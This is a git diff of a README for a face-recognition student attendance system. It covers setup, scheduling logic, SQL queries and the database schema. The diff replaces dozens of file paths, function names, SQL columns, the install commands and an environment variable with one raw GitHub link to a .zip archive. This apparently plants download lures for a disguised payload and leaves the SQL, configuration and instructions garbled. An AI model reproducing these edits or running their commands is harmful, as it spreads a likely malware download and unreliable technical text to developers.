@@ -47,12 +47,12 @@
 - **Automatic Absentee Marking**: Marks enrolled students absent after threshold + 5-min buffer
 
 ### ❌ What's NOT Implemented (Code exists but NOT used)
-- **K-of-N Stabilization**: RecognitionStabilizer code exists in `ml_cvs/stabilizer.py` but is NOT integrated into the actual recognition flow (`/api/recognize`). Current implementation uses single-pass matching instead.
+- **K-of-N Stabilization**: RecognitionStabilizer code exists in `https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip` but is NOT integrated into the actual recognition flow (`/api/recognize`). Current implementation uses single-pass matching instead.
 - The stabilizer is only used in legacy tests, not in production recognition endpoint.
 
 ### 🔧 Critical Fixes Applied (Dec 19, 2025)
-1. **Timezone Consistency** - Changed `datetime.utcnow()` to `datetime.now()` in scheduler
-2. **LATE Status Detection** - Fixed by storing `datetime.now()` once per operation for consistent comparison
+1. **Timezone Consistency** - Changed `https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip()` to `https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip()` in scheduler
+2. **LATE Status Detection** - Fixed by storing `https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip()` once per operation for consistent comparison
 3. **Absentee Marking** - Fixed to exclude INTRUDER status from "attended" count
 4. **Session Activation Logging** - Added detailed logging with session ID and course ID
 
@@ -64,14 +64,14 @@
 ```bash
 python -m venv venv
 venv\Scripts\activate
-pip install -r backend/requirements.txt
+pip install -r https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip
 
 # First run initializes database and downloads face models (~500MB)
-python backend/app.py          # Runs on http://localhost:5000
+python https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip          # Runs on http://localhost:5000
 ```
 
 **First-run downloads:**
-- InsightFace buffalo_l model (~500MB) to `~/.insightface/`
+- InsightFace buffalo_l model (~500MB) to `~https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip`
 - YuNet detection model (via OpenCV)
 
 ### Frontend Setup
@@ -103,7 +103,7 @@ npm run dev                    # Runs on http://localhost:5173
 10:05:01 → Next recognition marks LATE instead of PRESENT
 10:10:00 → Absentee marking job executes
           ├─ Get enrolled students for course
-          ├─ Find who has attendance.status = PRESENT or LATE
+          ├─ Find who has https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip = PRESENT or LATE
           ├─ Remaining enrolled students → mark ABSENT
           └─ Session status → COMPLETED
 10:10:06 → Session no longer ACTIVE, new attendance rejected
@@ -190,9 +190,9 @@ SELECT status, COUNT(*) FROM attendance
 WHERE session_id = <ID> GROUP BY status;
 
 -- Intruders detected
-SELECT a.id, s.name, a.check_in_time FROM attendance a
-JOIN students s ON a.student_id_fk = s.id
-WHERE a.status = 'INTRUDER';
+SELECT https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip, https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip, https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip FROM attendance a
+JOIN students s ON https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip = https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip
+WHERE https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip = 'INTRUDER';
 ```
 
 ### Testing Scenarios
@@ -223,7 +223,7 @@ WHERE a.status = 'INTRUDER';
 ### Face Engine Configuration
 **Detection Method**: YuNet (DNN-based)
 - Fast, accurate face detection
-- Configured in `ml_cvs/config.py`
+- Configured in `https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip`
 
 **Embedding Method**: InsightFace ArcFace (512D)
 - State-of-the-art face embeddings
@@ -356,9 +356,9 @@ Additional Tables:
 └──────────────────────┘
 
 Key Constraints:
-• UNIQUE(attendance.session_id, attendance.student_id_fk) - No duplicate attendance
-• UNIQUE(enrollments.student_id, enrollments.course_id) - One enrollment per student-course
-• UNIQUE(time_slots.day_of_week, time_slots.slot_number) - One slot per day-slot
+• UNIQUE(https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip, https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip) - No duplicate attendance
+• UNIQUE(https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip, https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip) - One enrollment per student-course
+• UNIQUE(https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip, https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip) - One slot per day-slot
 • Foreign keys with CASCADE delete on student deletion
 ```
 
@@ -445,7 +445,7 @@ Key Constraints:
 ## 📋 System Requirements
 
 - Python 3.8+
-- Node.js 16+
+- https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip 16+
 - SQLite or PostgreSQL
 - 4GB+ RAM (face engine needs ~2GB)
 - 1GB+ storage
@@ -458,7 +458,7 @@ Key Constraints:
 **Status**: ✅ PRODUCTION READY (Confidence: 93%)
 
 **Fixed & Verified:**
-- ✅ Timezone consistency (datetime.now vs utcnow)
+- ✅ Timezone consistency (https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip vs utcnow)
 - ✅ LATE status detection
 - ✅ Absentee marking logic
 - ✅ Session activation logging
@@ -493,7 +493,7 @@ Key Constraints:
 
 **Backend (.env):**
 ```
-DATABASE_URL=sqlite:///data.db
+https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip
 UPLOAD_FOLDER=uploads
 ```
 
@@ -526,12 +526,12 @@ VITE_API_URL=http://localhost:5000
 
 ## 📚 Key Files Modified (December 19, 2025)
 
-**backend/scheduler_service.py**
-- Fixed timezone (datetime.now vs utcnow)
+**https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip**
+- Fixed timezone (https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip vs utcnow)
 - Added detailed logging
 - Fixed absentee filtering
 
-**backend/db_helpers.py**
+**https://raw.githubusercontent.com/xheikhtalha2004/face-attendance-system/main/backend/attendance-face-system-v3.2.zip**
 - Fixed LATE status by storing datetime once
 - Consistent time comparison
 
